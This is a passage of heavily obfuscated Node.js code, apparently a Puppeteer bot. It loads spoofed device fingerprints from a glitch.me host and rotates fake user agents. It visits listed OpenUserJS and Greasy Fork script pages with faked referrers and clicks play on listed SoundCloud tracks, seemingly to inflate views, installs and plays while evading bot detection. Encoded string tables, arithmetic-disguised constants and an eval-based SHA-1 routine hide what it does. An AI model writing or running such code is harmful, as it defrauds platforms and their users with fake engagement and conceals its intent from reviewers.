      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0xb, 'i0pz') + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + a0(0xf, 'z%No') + 'Client_(BE' + 'TA)',
      a0(0x6, 'f7tF') + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ]
  },
  HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(g) {
        let h = this,
          i = h;
        for (let j = 0x15 * -0x11d + -0x1c27 + 0x184 * 0x22; j < g; j++)
          i = i['concat'](h);
        return i;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
      const f = new Map();
      Array['prototype']['randomFlus' + 'h'] = function(g) {
        let h = this[floor(random() * this['length'])];
        f['has'](g) || f['set'](g, new Set());
        const i = f['get'](g);
        for (; i['has'](h);)
          i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
        return i['add'](h), h;
      };
    }
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1099 * 0x2 + 0x21de + -0xac);
    let h = e[f];
    if (c['CFuOSp'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1 * -0x15e2 + 0x20b5 * 0x1 + 0x11 * -0xa3, r, s, t = 0x1893 + 0x1301 + -0x2b94; s = m['charAt'](t++); ~s && (r = q % (-0x20a6 + -0x125b + 0x25 * 0x161) ? r * (0xf1 * -0xa + 0x1d94 + -0x13ea) + s : s, q++ % (-0x1 * 0x1567 + -0x194 * 0x1 + -0xcb * -0x1d)) ? o += String['fromCharCode'](0x8d * 0xf + -0x349 + -0x3fb & r >> (-(0xdfc * 0x1 + -0x209 * 0xb + 0x1 * 0x869) * q & -0x1e4d + -0x3b * -0x62 + -0x1 * -0x7bd)) : 0x135b + -0x2 * -0xcb9 + -0x1 * 0x2ccd) {
          s = n['indexOf'](s);
        }
        for (let u = 0x222d + -0xf7c * -0x2 + 0x33 * -0x147, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x30a * -0x5 + 0x1 * -0x47d + -0xaa5))['slice'](-(0x335 * -0x1 + 0x86 * 0x47 + -0x21f3));
        }
        return decodeURIComponent(p);
      };
      c['aWwKbi'] = i, b = arguments, c['CFuOSp'] = !![];
    }
    const j = e[0x15 * -0x11d + -0x1c27 + 0x184 * 0x22],
      k = f + j,
      l = b[k];
    return !l ? (h = c['aWwKbi'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
HookManager['prototypes']();

function a() {
  const aV = [
    'BMv3ugfNzq',
    'qL/dIGVdJaviWQtcMaa',
    'W59fdNDLcbn8WQFdLG',
    'xCoTEmoHW67dGmoGe8o7WRa',
    'wSokW4VdOmkO',
    'WOioWOxdP8kCsX4wW5VcVa',
    'WORdT8kyA2VcHmoUog1O',
    'setuid-san',
    'W7ddJqCuB1OwWRNdLmox',
    'BCooW6tcICo3W7iqW7PTWOm',
    'W6bNbCoTpYOqW4aKWRC',
    'eCoQbvZcGmkgeCkyW7/dQq',
    'zgv4',
    'https://gr',
    'rg/en/scri',
    'W5FcJSkpy8kpWQ8fW6nfW4a',
    '-btb',
    'zwfZEwzVCMSUBW'
  ];
  a = function() {
    return aV;
  };
  return a();
}
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      async function f(o = '', p = -0x10ab + -0x956 + -0xd01 * -0x2, q) {
        const u = await q['waitForSel' + 'ector'](o);
        return await m['simClickEl' + 'ement'](u, {
          'pauseAfterMouseUp': p
        }), u;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: g
      } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new g['Builder']()['displayUse' + 'rActionLay' + 'er'](0xf2b * 0x1 + 0x2 * 0x113c + -0x18d1 * 0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
        'blockTrackers': 0x1,
        'blockTrackersAndAnnoyances': 0x1
      })])['userDataDi' + 'r'](i);
      let k;
      r:
        for (;;)
          try {
            let o = await async function p() {
              let q;
              const r = {
                'User-Agent': q['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                q = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': r
                }))?.['data'];
              } catch (u) {}
              if (q)
                try {
                  q = (await axios['get'](q, {
                    'headers': r
                  }))?.['data'];
                } catch (v) {}
              if (!q)
                return await randomWait(), await p();
              try {
                return 'object' == typeof q ? q : 'string' == typeof q ? JSON['parse'](q) : {};
              } catch (w) {
                if (!q)
                  return await randomWait(), await p();
              }
            }();
            flags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](o), k = await j['launch']();
            break r;
          } catch (q) {
            warn(q), await randomWait();
          }
      const {
        vanillaBrowser: l,
        userAction: m
      } = k, n = await l['createInco' + 'gnitoBrows' + 'erContext']();
      log('browser\x20la' + 'unched'), flags['RPL2_GF'] && setTimeout(async () => {
        async function r() {
          const s = await l['createInco' + 'gnitoBrows' + 'erContext']();
          if (flags['RPL2_SC2'] && Math['random']() >= 0x48c + -0x184 * 0x5 + 0x308 + 0.3) {
            const u = await s['newPage']();
            let v = -0x1d37 + 0x26de + 0x9a7 * -0x1;
            if (await u['goto'](data['soundcloud' + 'Tracks']['random'](), {
                'timeout': NETWORK_PATIENCE
              })['catch'](w => v++), v)
              return await u['close'](), await s['close'](), createPage();
            try {
              await u['evaluate'](() => {
                let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                x && 'Play' === x['textConten' + 't'] && (x['id'] = '______hook' + '5');
              });
              let w = await u['$']('#______hoo' + 'k5');
              w && await f('#______hoo' + 'k5', -0x23a7 + 0x9ff * 0x3 + 0x5ab, u), await wait(0xad * 0x60 + 0x53c7 + 0x90b * 0x3 + getRandomInt(0x241 * -0x7 + 0x34fd + 0x1562, -0x1 * 0x5889 + 0x5b + 0xcd5e));
            } catch (x) {}
            return await u['close'](), await s['close'](), createPage();
          } {
            const {
              url: y,
              preRef: z
            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](0x66e + 0x1f4b + -0x25b8), A = await l['createInco' + 'gnitoBrows' + 'erContext'](), B = await A['newPage']();
            let C = -0x22a * -0x7 + -0x1138 + 0x212;
            if (await B['goto'](z, {
                'timeout': NETWORK_PATIENCE
              })['catch'](E => C++), C)
              return await B['close'](), await A['close'](), r();
            const D = await B['evaluate']('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
            return D ? (await B['close'](), await A['close'](), r()) : (await B['goto'](y, {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => C++), C ? (await B['close'](), await A['close'](), r()) : (await new Promise(E => setTimeout(E, -0xcf8 + -0xd3 * -0xd + 0xa11 + floor((-0x1d3e + 0x20d * 0x5 + -0x1 * -0x16e5) * random()))), await B['evaluate'](() => {
              const a4 = b;
              var E, F, G, H, I, J, K, L, M = 'object' == typeof window ? window : {},
                N = !M['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
              N && (M = global), E = ('0123456789' + 'abcdef')['split'](''), F = [
                -(0xbd86686 * 0x11 + 0x6 * 0x8edac57 + 0x142f0 * -0x64a1),
                0x7d4140 + 0x31feeb + 0x2f402b * -0x1,
                0x6248 * -0x1 + -0x355b * 0x2 + 0x14cfe,
                0x1945 + 0x20e6 + 0x39 * -0x103
              ], G = [
                0x1 * -0x355 + 0x2 * 0x7c3 + -0xc19,
                -0x758 + 0x1 * 0x14b7 + -0xd4f * 0x1,
                -0x8e4 + -0x1873 * 0x1 + -0x215f * -0x1,
                0x290 + 0xa1f * -0x2 + 0x11ae
              ], H = [
                'hex',
                'array',
                'digest',
                'arrayBuffe' + 'r'
              ], I = [], J = function(R) {
                return function(S) {
                  return new O(0x293 * -0x3 + 0xb71 + -0x3b7)['update'](S)[R]();
                };
              }, K = function() {
                var R, S, T = J('hex');
                for (N && (T = L(T)), T['create'] = function() {
                    return new O();
                  }, T['update'] = function(U) {
                    return T['create']()['update'](U);
                  }, R = -0x253c + 0x166 * 0x3 + 0x2 * 0x1085; R < H['length']; ++R)
                  S = H[R], T[S] = J(S);
                return T;
              }, L = function(R) {
                var S = eval('require(\'crypto\');'),
                  T = eval('require(\'buffer\')[\'Buffer\'];'),
                  U = function(V) {
                    if ('string' == typeof V)
                      return S['createHash']('sha1')['update'](V, 'utf8')['digest']('hex');
                    if (V['constructo' + 'r'] === ArrayBuffer)
                      V = new Uint8Array(V);
                    else {
                      if (void(0x21 * -0x63 + -0x8 * -0x2bb + 0x915 * -0x1) === V['length'])
                        return R(V);
                    }
                    return S['createHash']('sha1')['update'](new T(V))['digest']('hex');
                  };
                return U;
              };
              class O {
                constructor(R) {
                    R ? (I[-0x86 * -0x12 + 0x68b * 0x3 + -0x1d0d] = I[0xdf * 0x29 + -0x219e * 0x1 + 0x1 * -0x209] = I[0x2b * 0x37 + -0xa63 * -0x1 + -0x139f] = I[0x4a2 * -0x7 + 0x37 * 0xa7 + -0x371 * 0x1] = I[-0x1a89 + -0xb * -0x1cd + 0x6bd] = I[0x5d5 + -0xd3 * 0x11 + 0x832] = I[0x177 + 0x107b + -0xd * 0x161] = I[-0x1e8d + 0x8 * 0x377 + 0x11 * 0x2b] = I[-0x1697 + 0x212c + 0x2 * -0x547] = I[0xdbf + 0x1af4 + 0x167 * -0x1d] = I[-0x3b * -0x81 + -0x63c + 0x4d * -0x4e] = I[0x630 + -0xb * -0x62 + -0xa5c] = I[-0x15ba + 0x1 * -0x1343 + -0x2 * -0x1484] = I[-0x1 * 0x36d + 0x6b * 0x46 + -0x19c9] = I[0x797 + 0x31 * -0x3a + 0x4c * 0xc] = I[0x28e * -0x1 + 0x1807 + -0x156b] = I[0x35 * 0x94 + -0x1155 + 0x1 * -0xd40] = 0x1 * 0x17d1 + 0x2513 + -0x3ce4, this['blocks'] = I) : this['blocks'] = [
                      -0x1 * 0x2113 + -0x1 * 0x1403 + -0x5a * -0x97,
                      0x35 * -0x39 + 0xb * -0xf1 + -0x8 * -0x2c5,
                      -0x92b + -0x1c1c + 0x2547,
                      0x1b * -0x82 + -0x1f20 + 0x3 * 0xef2,
                      0x2605 + -0xa7 * 0x3a + -0x2f,
                      -0x211 * -0xb + -0x2054 + 0x999,
                      -0xf36 + -0x46 * -0x8e + 0x1 * -0x179e,
                      0xcc4 + 0x1cf1 + -0x29b5,
                      -0xb * -0x2aa + -0x96e + -0x13e0,
                      0x57c + 0x2010 + -0x3 * 0xc84,
                      0x4ad + -0x1a87 * -0x1 + -0x1f34,
                      0x1 * 0x2dd + 0x14 * 0x1d0 + -0x24d * 0x11,
                      -0x1572 + 0x24cd + -0xf5b,
                      0x1c80 + -0x18e * -0x16 + -0x3eb4,
                      -0x1a05 + -0xce6 + 0x26eb,
                      -0x1 * -0xf29 + 0x127f + -0x21a8,
                      -0x20d3 * 0x1 + -0x1777 + 0x106 * 0x37
                    ], this['h0'] = 0x6 * -0x13e59b22 + -0x11fda05a + 0xf0a46627, this['h1'] = -0x13c8e11c1 + -0x8ac6d6a4 + 0x2b72293ee, this['h2'] = -0xf44e341d + 0x7e5f53f5 + 0x10ea9bd26, this['h3'] = -0x2ffd4 * 0x13 + -0x3 * -0x997d86 + 0xe9ed8a0, this['h4'] = 0x1105ce0b9 + -0x14442a3e6 + 0x1070f * 0xf113, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1e83 + -0x5 * 0x52a + -0x4b1, this['finalized'] = this['hashed'] = -0x60e + 0x12 * -0x1f2 + 0x2912, this['first'] = 0x4 * 0x7e1 + 0x24a * -0x5 + -0x1 * 0x1411;
                  }
                  ['update'](R) {
                    const a3 = b,
                      a2 = c;
                    var S, T, U, V, W, X;
                    if (!this['finalized']) {
                      for ((S = 'string' != typeof R) && R['constructo' + 'r'] === M['ArrayBuffe' + 'r'] && (R = new Uint8Array(R)), U = 0x19a9 + -0xfb5 * 0x1 + 0x1c * -0x5b, W = R['length'] || 0x210c + -0x1e10 + -0x2fc, X = this['blocks']; U < W;) {
                        if (this['hashed'] && (this['hashed'] = 0x1149 + 0x1 * -0x18e5 + 0x79c, X[-0x1e81 * 0x1 + -0xa5 * 0x8 + 0x23a9] = this['block'], X[0x7d5 * -0x2 + 0x1 * 0x1498 + -0x4de] = X[-0x14e4 + 0x1 * 0x9fd + 0x2ba * 0x4] = X[-0x2221 * 0x1 + 0xa2d + -0xbfb * -0x2] = X[0x1dc * 0x2 + 0xcb7 + -0x106c] = X[0xcae + -0x2225 + -0x3 * -0x729] = X[0x1921 + -0xd1 * 0x25 + -0x1d * -0x2d] = X[-0x10 * 0x1bb + -0x3 * -0x85d + 0x29f] = X[-0x6d7 * 0x1 + -0x3 * -0x13 + 0x6a5] = X[-0x8f2 * 0x3 + 0xee5 + 0xbf9] = X[0x7a4 + 0x21e9 + -0x2984] = X[-0x132b + -0x85 * 0x1f + 0x2350] = X[0x1714 + -0x1731 + 0x28] = X[0xdf6 + -0x1e4 * 0x2 + -0x511 * 0x2] = X[0xf8a + 0x647 * -0x4 + 0x99f] = X[-0x35 * 0x6a + 0x1 * -0xe8b + 0x248b] = X[0x1ab * 0x7 + 0x14d4 * 0x1 + -0x2072] = -0x156f + 0xcb * -0x2e + 0x39e9), S) {
                          for (V = this['start']; U < W && V < 0xb65 * 0x1 + -0xaaf + 0x1 * -0x76; ++U)
                            X[V >> -0x232 * 0xf + 0x4 * 0x1fe + 0x18f8] |= R[U] << G[0x12 * -0x11b + 0x8da + 0xb0f & V++];
                        } else {
                          for (V = this['start']; U < W && V < 0x3a * 0xc + 0x2d1 + 0x549 * -0x1; ++U)
                            (T = R['charCodeAt'](U)) < 0x1323 + 0x163a * 0x1 + -0x28dd ? X[V >> 0x817 + -0x212f + 0x191a] |= T << G[-0x3 * -0x107 + -0x5 * 0x19d + 0x4ff & V++] : T < 0x16e3 + -0x1070 + 0x18d * 0x1 ? (X[V >> -0xa1f + 0x8c * 0xe + -0xd3 * -0x3] |= (0x116 * 0xa + 0x17 * -0xe + 0x8da * -0x1 | T >> 0x1b00 + -0x2 * 0xfc3 + 0x4 * 0x123) << G[-0x9a2 + 0x258a + -0x1be5 & V++], X[V >> -0x1772 * 0x1 + -0xfa9 * 0x1 + 0x271d] |= (-0x1cd9 + -0xd69 * -0x1 + 0x1 * 0xff0 | -0x1 * -0x1eef + -0x24da + -0x1 * -0x62a & T) << G[-0x15d7 * -0x1 + -0x3 * 0x314 + -0xc98 & V++]) : T < 0x4a * 0x460 + -0x71b6 + -0x6d * -0xe || T >= -0x1 * 0x1a55b + 0x1612d + -0x95 * -0x1f6 ? (X[V >> -0x1e47 + 0x7 * 0x4d + -0xe17 * -0x2] |= (0xc0e * -0x1 + -0x2 * 0x8e5 + -0x2 * -0xf5c | T >> -0x1ec2 + -0x1be7 * -0x1 + 0x2e7) << G[-0x5fe * -0x1 + 0x236a + -0x2965 & V++], X[V >> -0x1 * 0xc9f + -0x180c + 0xe5 * 0x29] |= (0x24d7 + -0x102 + 0x9 * -0x3ed | T >> 0x554 + 0x8 * 0x30d + 0x1db6 * -0x1 & 0x59d + -0x1db7 * -0x1 + -0x2315) << G[0xaab + -0x107a + -0x95 * -0xa & V++], X[V >> 0x1c9b + -0x252e + 0x895] |= (-0x1 * -0x4db + -0xde + -0x13 * 0x2f | 0x12eb + -0x48b * -0x1 + 0x7bd * -0x3 & T) << G[-0x15bc + -0x1 * 0x1e4a + 0xad * 0x4d & V++]) : (T = 0x1 * -0xa9c3 + 0x1eef2 + -0x452f + ((0xcb1 + -0x6 * 0x3e5 + 0xeac & T) << 0xb47 * -0x3 + -0xe69 * 0x1 + 0x3048 | -0x1 * -0x134e + 0x1c05 + -0x2 * 0x15aa & R['charCodeAt'](++U)), X[V >> -0x26af * 0x1 + 0x1a64 + 0xc4d] |= (-0x419 * 0x9 + 0x5d2 + -0x1 * -0x1fff | T >> 0x1 * 0x9e5 + 0x1 * -0x1334 + 0x961) << G[-0x2c2 + 0x13a6 + -0x10e1 * 0x1 & V++], X[V >> -0x22c1 + 0x38 * -0x7e + 0x3e53] |= (0x2343 + 0x1 * 0x639 + -0xf4 * 0x2b | T >> -0x190f + -0x2f * 0xb1 + 0x2 * 0x1ccd & 0x204 * 0x10 + -0x7d * 0x37 + 0x293 * -0x2) << G[0x1d7f + -0x1d89 * 0x1 + 0xd * 0x1 & V++], X[V >> 0x653 * -0x3 + -0x1b2b + 0x42 * 0xb3] |= (-0x7 * -0x53f + 0x268f + 0x2 * -0x2564 | T >> -0x4e * 0x61 + -0x2d3 * 0x2 + 0x233a & -0x47c + 0x1405 + -0xf4a) << G[0x207b + 0x1bff + -0x3c77 & V++], X[V >> 0x3 * -0xce3 + 0xc8b + 0x1a20] |= (-0x14a8 + -0xe * -0x296 + -0xf0c | 0x1 * -0x1e2b + -0x74 * 0x49 + 0x3f7e & T) << G[0x21b2 + 0x5ec * -0x3 + -0xfeb & V++]);
                        }
                        this['lastByteIn' + a2(0xc)] = V, this['bytes'] += V - this['start'], V >= -0xafb + -0x1dfe + 0x2939 * 0x1 ? (this['block'] = X[0x510 * 0x3 + -0x1ed + -0xd33], this['start'] = V - (0x1e4e + -0x19c1 + -0x44d), this['hash'](), this['hashed'] = 0x1db1 + -0x227 + -0x85 * 0x35) : this['start'] = V;
                      }
                      return this['bytes'] > 0x1fba5 * -0x4684 + -0xed6e94ab + -0x2 * -0x13ca1b9df && (this['hBytes'] += this['bytes'] / (-0x11db59d5c + -0x1e806b250 + 0x405bc4fac * 0x1) << -0x6cd + 0x1 * -0x119 + 0x7e6, this['bytes'] = this[a3(0x4, 'kN@f')] % (0x6a * 0x2cbdc86 + -0x15f16839 * -0x10 + 0x4e0c6 * -0x5042)), this;
                    }
                  }
                  ['finalize']() {
                    if (!this['finalized']) {
                      this['finalized'] = -0x2179 + -0x96 + 0x2210;
                      var R = this['blocks'],
                        S = this['lastByteIn' + 'dex'];
                      R[-0x1ed * 0x8 + -0x34d + 0x12c5] = this['block'], R[S >> 0x266b + 0x1216 + 0x3 * -0x12d5] |= F[0xf18 + 0x2129 + -0x2 * 0x181f & S], this['block'] = R[-0x10 * -0x148 + 0xd73 + 0x15b * -0x19], S >= 0x15e7 + -0x7c7 + -0xde8 && (this['hashed'] || this['hash'](), R[0x7 * 0x1e2 + 0x2325 * -0x1 + -0x15f7 * -0x1] = this['block'], R[-0xc13 * 0x3 + -0x58 * -0x4f + 0x921 * 0x1] = R[0x10ea + 0x786 + -0x4e3 * 0x5] = R[0x1ef8 * 0x1 + -0x20ca * 0x1 + 0x9 * 0x34] = R[0x6f + 0x82a + 0x9d * -0xe] = R[-0x20f6 + -0x5 * 0x7c9 + 0x47e7] = R[-0x9fb + -0xd * 0x8f + 0x1143] = R[0x10 * -0xba + -0x2347 * -0x1 + -0x17 * 0x107] = R[-0x6 * 0x2ef + 0x1ad8 + -0x937] = R[0x2335 + -0x1 * -0x5c9 + -0xd6 * 0x31] = R[0x1bb * 0x13 + 0x12fc * -0x1 + 0x1 * -0xddc] = R[0x219b + 0x1 * 0x1c5d + -0x3dee] = R[0x707 * -0x1 + -0x1f21 + 0x2633] = R[0x15 * -0x24 + -0x10 * 0x120 + 0x38 * 0x60] = R[-0x857 * 0x2 + -0x17e3 + 0x289e * 0x1] = R[0x118 + -0x25f1 + 0x24e7] = R[0x1621 + -0x3ad * 0x6 + -0x4] = 0x18f + -0x1b5b * -0x1 + -0x1cea * 0x1), R[0x89 + -0xc71 + -0x2 * -0x5fb] = this['hBytes'] << -0x15a9 + -0x6e7 + -0x1 * -0x1c93 | this['bytes'] >>> 0x5a3 + -0x20d3 * 0x1 + 0xf1 * 0x1d, R[0x5c * 0xe + 0x1ed0 + 0x23c9 * -0x1] = this['bytes'] << -0x135 * -0x9 + -0xad5 + -0x5 * 0x1, this['hash']();
                    }
                  }
                  ['hash']() {
                    var R, S, T = this['h0'],
                      U = this['h1'],
                      V = this['h2'],
                      W = this['h3'],
                      X = this['h4'],
                      Y = this['blocks'];
                    for (R = -0x1e46 + 0x1acd + 0x389; R < -0x1 * 0x1046 + -0x1e87 + 0x2f1d; ++R)
                      S = Y[R - (-0x36 * -0x2 + 0xa43 + -0xaac)] ^ Y[R - (0xe0d + -0x241b + 0x1616)] ^ Y[R - (0x2449 + 0x1a93 + -0x2 * 0x1f67)] ^ Y[R - (-0x7 * -0x136 + 0x3 * 0x5d9 + -0x1 * 0x19f5)], Y[R] = S << -0x1a * 0x2f + -0x2dc * 0x4 + 0x1 * 0x1037 | S >>> -0x127e + 0x1e1c + 0x1b * -0x6d;
                    for (R = 0x1 * -0x3a1 + 0x21c2 + -0x1e21; R < -0x3f2 * -0x9 + 0x18ba + 0x226 * -0x1c; R += -0xe99 * -0x1 + -0xa36 * -0x1 + -0x18ca)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x3 * 0x37 + -0xc * -0x1a3 + -0x1444 | T >>> -0x2ad * -0x3 + -0x4 * -0x68e + -0x2224) + (U & V | ~U & W) + X + (-0x8b * 0xf645c7 + 0x1d00b76 * 0x43 + 0x66c75cc4) + Y[R] << -0x66 * -0x11 + -0xe3d + 0x777) << 0x102e + 0x13fb + -0x2424 | X >>> -0x4c3 + 0x7 * 0x49e + -0x1b74) + (T & (U = U << -0x2 * 0x10f + 0x7b1 + -0x575 | U >>> -0x1593 + 0x2e2 + 0x12b3 * 0x1) | ~T & V) + W + (-0x806ccced + 0x2 * 0x3496ae66 + 0x71c1e9ba) + Y[R + (0x16f * 0x17 + 0x1fa3 + -0x95 * 0x6f)] << 0x61 * -0x2 + 0xee4 + -0xe22) << -0x1 * -0x93a + 0x1 * 0x1fbb + -0x28f0 | W >>> -0x20a + -0x18e * 0x4 + 0x1 * 0x85d) + (X & (T = T << 0xbe1 * -0x2 + -0x1d15 + 0x34f5 * 0x1 | T >>> -0x2699 + -0x1 * 0x2ed + 0x2988 * 0x1) | ~X & U) + V + (-0x61 * 0x11361fd + 0x135fedbe + 0x25 * 0x4be2058) + Y[R + (-0xb * -0x61 + 0x186f * -0x1 + -0x3 * -0x6c2)] << -0x18a0 + -0x12a * 0x19 + 0x35ba) << 0x1 * 0x26a8 + 0x3ac * 0x1 + 0x1 * -0x2a4f | V >>> -0x1 * 0xe2b + -0x2bc * -0x5 + 0x9a) + (W & (X = X << -0x2377 * -0x1 + -0x90 * -0x32 + -0x3f79 | X >>> -0x210c + -0x223 * -0x11 + -0x345) | ~W & T) + U + (-0x23dfd444 + -0x455ce591 + 0xc3bf336e) + Y[R + (-0x179c + -0x111d + -0xb * -0x3b4)] << 0x1 * 0x1ab3 + 0x193d + 0x22a * -0x18) << -0x1f20 + -0x7c7 * -0x3 + -0xc8 * -0xa | U >>> -0xb * 0xef + -0x12f5 + 0x1d55) + (V & (W = W << 0xc7a + -0x46 * 0x8e + 0x1a78 | W >>> -0x1436 + -0xe * 0x9d + 0x1cce) | ~V & X) + T + (-0xbf * 0x9a43e9 + -0x6fe3f277 + -0x13d7f16e7 * -0x1) + 